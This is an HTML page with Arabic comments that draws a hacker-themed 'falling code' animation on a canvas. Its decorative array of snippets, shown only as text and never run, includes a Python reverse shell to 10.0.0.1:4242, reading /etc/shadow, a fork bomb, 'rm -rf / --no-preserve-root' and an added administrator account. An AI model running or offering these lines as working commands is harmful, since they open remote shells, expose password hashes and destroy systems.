<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>S Y S T E M _ C O D E _ F L O W</title>
    <style>
        body { margin: 0; padding: 0; overflow: hidden; background: #000; color: #0f0; font-family: 'Courier New', monospace; }
        canvas { display: block; position: absolute; top: 0; left: 0; }
        
        /* تأثير لمعان خفيف */
        #codeCanvas { filter: drop-shadow(0 0 2px #0f0); }
    </style>
</head>
<body>

    <canvas id="codeCanvas"></canvas>

    <script>
        const canvas = document.getElementById('codeCanvas');
        const ctx = canvas.getContext('2d');

        // اجعل الكانفاس بملء شاشة الجوال تماماً
        canvas.height = window.innerHeight;
        canvas.width = window.innerWidth;

        // --- مخزون الأكواد البرمجية الحقيقية ---
        const codeSnippets = [
            // C++ / C
            "for(int i=0; i<net.size(); i++) {",
            "  if(connect(socket, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {",
            "  char buffer[1024] = {0};",
            "  FILE *fp = fopen('/etc/shadow', 'r');",
            "  printf('Initializing kernel exploit...\\n');",
            "  pthread_create(&thread_id, NULL, exploit_loop, NULL);",
            "  while(1) { fork(); } // Fork Bomb",
            
            // Python
            "import socket, subprocess, os;",
            "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);",
            "s.connect(('10.0.0.1', 4242));",
            "os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2);",
            "p=subprocess.call(['/bin/sh', '-i']);",
            "print('Fetching network interface data...')",
            
            // JavaScript / HTML
            "fetch('/api/v1/user/data', { method: 'POST' });",
            "document.cookie = 'session_id=exploit_detected';",
            "window.location.replace('https://hidden-server.onion');",
            "eval(atob('Z2xvYmFsLnByb2Nlc3MuZXhpdCgwKTs='));",
            
            // Bash / CMD
            "rm -rf / --no-preserve-root",
            "iptables -A INPUT -p tcp --dport 80 -j DROP",
            "netuser administrator /add exploit_user"
        ];

        // --- إعداد الأعمدة والخطوط ---
        const fontSize = 14; // حجم الخط أصغر قليلاً ليناسب الأكواد
        // حساب عدد الأعمدة بناءً على عرض الشاشة وحجم الخط (نقسم على 2 لإعطاء مسافة)
        const columns = Math.floor(canvas.width / (fontSize * 1.5)); 

        // مصفوفة لتخزين بيانات كل عمود ( drops )
        // كل عنصر فيها عبارة عن كائن يحتوي على: y, speed, snippets (مخزون الأكواد الخاصة به)
        const drops = [];
        for (let x = 0; x < columns; x++) {
            drops[x] = {
                y: Math.random() * -canvas.height, // ابدأ من موقع عشوائي فوق الشاشة
                speed: 1 + Math.random() * 3, // سرعة ساطة عشوائية
                snippets: [...codeSnippets].sort(() => 0.5 - Math.random()) // قم بترتيب مخزون الأكواد عشوائياً
            };
        }

        // --- دالة الرسم الأساسية ---
        function draw() {
            // تأثير "الذيل" (التلاشي)
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            // اجعل الأكواد خضراء فسفورية
            ctx.fillStyle = "#0f0";
            ctx.font = fontSize + "px 'Courier New', monospace";

            // ارسم الأكواد في كل عمود
            for (let i = 0; i < drops.length; i++) {
                // اختر كوداً من مخزون العمود الحالي
                const snippet = drops[i].snippets[drops[i].snippets.length - 1]; 

                // ارسم الكود في موقع (x*fontSize*1.5, drops[i].y)
                ctx.fillText(snippet, i * fontSize * 1.5, drops[i].y);

                // حرك الـ Y لأسفل بناءً على سرعة العمود
                drops[i].y += drops[i].speed;

                // إذا وصل الكود لأسفل الشاشة، قم بإعادة تعيينه للأعلى
                // لإعطاء انطباع باللانهائية وعدم التزامن
                if (drops[i].y > canvas.height) {
                    drops[i].y = 0;
                    // قم بترتيب مخزون الأكواد عشوائياً مرة أخرى لإظهار كود جديد
                    drops[i].snippets.sort(() => 0.5 - Math.random());
                }
            }
        }

        // --- تشغيل الأنيميشن ---
        // قم باستدعاء دالة الرسم باستمرار (مثلاً 30 مرة في الثانية)
        setInterval(draw, 33);

        // --- التعامل مع تغيير حجم الشاشة (في حال تم تدوير الجوال) ---
        window.addEventListener('resize', () => {
            canvas.height = window.innerHeight;
            canvas.width = window.innerWidth;
            // يجب إعادة حساب الأعمدة وإعادة تعيين drops عند تغيير الحجم
            const newColumns = Math.floor(canvas.width / (fontSize * 1.5));
            for (let x = 0; x < newColumns; x++) {
                if(drops[x] === undefined) {
                    drops[x] = {
                        y: Math.random() * -canvas.height,
                        speed: 1 + Math.random() * 3,
                        snippets: [...codeSnippets].sort(() => 0.5 - Math.random())
                    };
                }
            }
        });
    </script>
</body>
</html>
